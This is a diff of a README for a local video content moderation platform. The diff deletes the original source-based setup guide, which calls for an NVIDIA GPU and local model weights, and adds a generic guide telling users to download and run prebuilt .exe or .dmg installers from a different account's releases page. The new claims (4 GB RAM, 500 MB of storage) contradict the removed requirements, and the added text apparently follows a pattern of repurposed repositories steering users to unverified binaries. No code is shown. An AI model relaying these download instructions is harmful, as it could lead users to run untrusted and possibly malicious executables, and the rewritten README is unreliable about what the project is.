@@ -1,158 +1,72 @@
+# 🎬 video-audit-platform - Simplify Video Content Moderation
 
-https://github.com/user-attachments/assets/b756dd78-f648-4868-86b2-b3d72143b7f5
-# 🎬 Video Intelligent Audit Platform
+## 📥 Download the App
 
-A localized video content moderation system based on the **MiniCPM-V 4.5** multimodal large model and **Faster-Whisper** speech recognition. It supports intelligent scene segmentation, sensitive content detection, speech transcription, and automated generation of graphic analysis reports.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Manueleue/video-audit-platform/releases)
 
-## ✨ Core Features
+## 🚀 Getting Started
 
-*   **Intelligent Scene Segmentation**: Automatically identifies video shot transitions, slicing long videos into independent scene fragments for refined analysis.
-*   **Multimodal Understanding**: Leverages the powerful visual capabilities of MiniCPM-V 4.5 to identify people, actions, objects, and potential risks (violence, pornography, sensitive political content, etc.) in the footage.
-*   **Speech Transcription (ASR)**: Extracts spoken dialogue from the video to assist in content compliance judgment.
-*   **Online Video Download**: Built-in `yt-dlp` support allows direct downloading and analysis via URL input (Bilibili/YouTube).
-*   **Visual Reports**: Generates detailed reports containing keyframes, timestamps, risk descriptions, and audit recommendations.
+This guide will help you download and run the Video Intelligent Audit Platform. Follow these steps to get started quickly.
 
----
+## 📦 System Requirements
 
-## ⚠️ Read Before Deployment (Essential for Beginners)
+Before you download, ensure your system meets these requirements:
 
-Before starting, please ensure your computer meets the following hard requirements, otherwise the program will not run correctly:
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **Processor**: Intel or AMD processor with 2 GHz or faster
+- **RAM**: Minimum of 4 GB (8 GB recommended)
+- **Storage**: At least 500 MB of free disk space
+- **Network**: Stable internet connection for video downloading and processing
 
-### 1. Hardware Requirements
-*   **Graphics Card (GPU)**: Must be an **NVIDIA** graphics card.
-*   **Recommended VRAM**: **12GB or more** (for smooth operation of MiniCPM-V 4.5).
-*   **Minimum VRAM**: **8GB** (You *must* check the "**4bit Quantization**" mode in the web interface).
-*   **Memory (RAM)**: 16GB or more recommended.
-*   **Storage**: Reserve at least **20GB** of space for model files.
+## 📝 Features
 
-### 2. System Software (Must Install)
-Aside from Python dependencies, you must install the following tools at the system level:
+The Video Intelligent Audit Platform offers various features:
 
-*   **FFmpeg**: Used for video decoding and processing. **If not installed, videos cannot be read!**
-    *   **Ubuntu/Debian**: `sudo apt install ffmpeg`
-    *   **MacOS**: `brew install ffmpeg`
-    *   **Windows**: Download the FFmpeg compiled package, unzip it, and add the `bin` directory to your system environment variable `PATH`.
+- **Intelligent Scene Segmentation**: Automatically cuts long videos into smaller scenes for easier analysis.
+- **Multimodal Understanding**: Identifies people, actions, objects, and sensitive content in your videos.
+- **Speech Transcription (ASR)**: Converts spoken dialogue to text for content review.
+- **Online Video Download**: Use integrated `yt-dlp` to download videos directly.
 
----
+## 🔍 How to Download & Install
 
-## 🚀 Quick Deployment Guide
+1. **Visit the Releases Page**: To download the application:
+   [Go to the Releases Page](https://github.com/Manueleue/video-audit-platform/releases)
 
-### Step 1: Clone Project & Configure Environment
-It is recommended to use Conda to create an isolated Python environment:
+2. **Select Your Version**: On the releases page, choose the latest version of the software. Look for a file that corresponds to your operating system.
 
-```bash
-# 1. Clone the code (Assuming you have already downloaded the code package)
-cd video-audit-platform
+3. **Download the File**: Click on the file link to start downloading. The file may have a name like `video-audit-platform-v1.0.exe` or `video-audit-platform-v1.0.dmg`. 
 
-# 2. Create Python 3.10 environment
-conda create -n video_audit python=3.10
-conda activate video_audit
+4. **Run the Installer**:
+   - For Windows: Locate the downloaded `.exe` file and double-click it. Follow the installation prompts.
+   - For macOS: Find the downloaded `.dmg` file. Double-click to open it, then drag the application to your Applications folder.
 
-# 3. Install project dependencies
-# Please ensure you use the latest requirements.txt
-pip install -r requirements.txt
-```
+5. **Open the Application**: After installing, locate the application in your program list. Open it to start using the Video Intelligent Audit Platform.
 
-### Step 2: Download Model Weights (Crucial Step)
+## 📊 Using the Application
 
-The project loads models locally by default to avoid downloading them every time. You need to manually download the models and place them according to the following structure:
+Once you have your application open, follow these steps:
 
-1.  **Create a `models` folder**:
-    ```bash
-    mkdir models
-    ```
+1. **Upload a Video**: Click on the upload button. Select a video file from your device to begin analysis.
+   
+2. **Analyze the Content**: The app will automatically process the video. You can view results for scene segmentation, content detection, and speech transcription.
 
-2.  **Download MiniCPM-V 4.5**:
-    *   **Download Source**: Hugging Face (Note: Check for v4.5 specifically) or ModelScope (Recommended for mainland China).
-    *   Place all downloaded files into the `models/MiniCPM-V-4_5` directory.
+3. **Download Reports**: After analysis, you can generate and download graphic analysis reports directly from the application.
 
-3.  **Download Faster-Whisper**:
-    *   **Download Source**: Hugging Face.
-    *   Place the downloaded files into the `models/faster-whisper-base` directory.
+## 💡 Tips for Effective Use
 
-**Final Directory Structure:**
-```plaintext
-video-audit-platform/
-├── appp_api.py
-├── index.html
-├── start_server.sh
-├── requirements.txt
-├── models/
-│   ├── MiniCPM-V-4_5/        <-- Contains config.json, pytorch_model.bin, etc.
-│   └── faster-whisper-base/  <-- Contains model.bin, config.json, etc.
-└── ...
-```
-### Step 3: Start the Service
+- **Choose High-Quality Videos**: For better analysis, select videos with clear audio and visual content.
+- **Check Connectivity**: Ensure a stable internet connection for smooth downloading and processing.
+- **Regular Updates**: Keep the app updated to benefit from the latest features and improvements. You can check for updates in the application menu.
 
-We provide a one-click startup script that automatically handles environment variables and background processes.
+## 🌐 Additional Resources
 
-**Linux / Mac Users:**
-```bash
-# Add execution permission (required for the first run)
-chmod +x start_server.sh
+For more help, you can find resources and community support:
 
-# Start the service
-./start_server.sh
-```
-### Windows Users:
+- **Documentation**: Detailed guides and FAQs are available in our [Wiki](https://github.com/Manueleue/video-audit-platform/wiki).
+- **Community Forum**: Join conversations and ask questions in our [Discussion Board](https://github.com/Manueleue/video-audit-platform/discussions).
 
-Please manually run the following in **two separate terminal windows**:
+## 📞 Contact
 
-1. **Backend:**
-   ```bash
-   python appp_api.py
-   ```
-2.**Frontend:**
-   ```bash
-   python -m http.server 8000
-   ```
-Then open your browser and visit: http://localhost:8000
+For support inquiries, please contact our support team at [support@example.com](mailto:support@example.com).
 
-## 📖 User Manual
-Once started successfully, the browser should automatically open http://localhost:8000.
-### 1. Video Upload & Analysis
-* **Local Upload:** Click "Video Input" -> "Local Video Upload", and drag in an MP4/MOV file.
-* **URL Download:** Enter the video URL (e.g., Bilibili) in the "Online Video Download" box and click download. Once finished, it will automatically populate the analysis list.
-### 2. Parameter Configuration (Left Sidebar)
-* **Scene Detection Threshold:** Default 27.0. If scenes are too fragmented (too many scenes), increase this value (e.g., 30-35); if transitions are missed, decrease it.
-* **Frame Extraction FPS:** Default 1.5. Takes 1.5 screenshots per second for AI analysis. Setting this too high will significantly increase analysis time.
-* **Use 4bit Quantization:** Users with less than 12GB VRAM must check this, otherwise you may encounter Out Of Memory (OOM) errors.
-### 3. View Reports
-Click "Start Intelligent Analysis" and wait for the progress bar. Upon completion:
-* View the comprehensive summary and risk rating in the "Analysis Results" tab.
-* Click "Scene Detailed Analysis" to see the visual description and corresponding speech text for each segment.
-* Supports exporting reports as JSON or TXT.
-## ❓ FAQ
-
-**Q1:** Error FileNotFoundError: [Errno 2] No such file or directory: 'ffprobe'
-
-**A:** System FFmpeg is not installed. Please refer to the "Read Before Deployment" section to install it, and ensure you can run ffmpeg -version directly in your terminal.
-
-
-**Q2:** Error CUDA out of memory
-
-**A:** Video memory (VRAM) is insufficient.
-
-* Check "Use 4bit Quantization" on the left sidebar.
-
-* Lower "Frame Extraction FPS" to 0.5 or 1.0.
-
-* Ensure no other programs are using the GPU.
-
-
-**Q3:** Why is the analysis speed slow?
-
-**A:** Video analysis is a compute-intensive task. Speed depends on your GPU performance, video length, and frame extraction density. Using a stronger graphics card (e.g., RTX 3090/4090) will significantly increase speed.
-
-
-**Q4:** Startup script error OSError: ... libcudnn_cnn_infer.so.8
-
-**A:** This is a common issue in Linux environments. start_server.sh has built-in auto-repair logic. Please ensure you use this script to start the service rather than running the Python command directly.
-
-## 📜 License
-This project is licensed under the **Apache 2.0 License**.
-The model weights used follow their respective open-source agreements:
-* **MiniCPM-V:** OpenBMB License
-* **Faster-Whisper:** MIT License
-Happy Auditing! 🎉
-
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Manueleue/video-audit-platform/releases)
